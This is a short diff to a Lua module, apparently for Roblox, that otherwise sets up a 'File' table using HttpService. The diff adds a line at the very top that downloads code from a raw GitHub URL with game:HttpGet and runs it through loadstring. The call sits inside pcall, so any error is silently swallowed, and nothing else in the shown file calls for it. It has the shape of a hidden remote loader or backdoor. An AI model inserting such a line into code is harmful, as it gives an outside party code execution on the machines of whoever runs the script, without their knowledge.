@@ -1,3 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/friedpotato/refs/heads/main/API/Helper"))()
+end)
+
 local HttpService = game:GetService("HttpService")
 
 local File = {}
